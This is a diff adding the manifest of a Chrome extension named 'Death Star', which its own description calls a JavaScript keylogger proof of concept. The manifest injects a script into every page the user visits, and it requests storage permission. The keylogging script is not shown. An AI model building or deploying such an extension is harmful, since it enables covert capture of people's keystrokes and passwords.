@@ -1,0 +1,19 @@
+{
+	"manifest_version": 2,
+	"name": "Death Star",
+	"description": "JavaScript based chrome extension Keylogger PoC",
+	"version": "1",
+	"icons": { 
+	  "128": "icon-16.png" 
+	},
+	"content_scripts":[
+		{
+			"run_at":"document_end",
+			"matches":["<all_urls>"],
+			"js":["jquery.min.js","script.js"]
+		}
+	],
+	"permissions":[
+		"storage"
+	]
+}
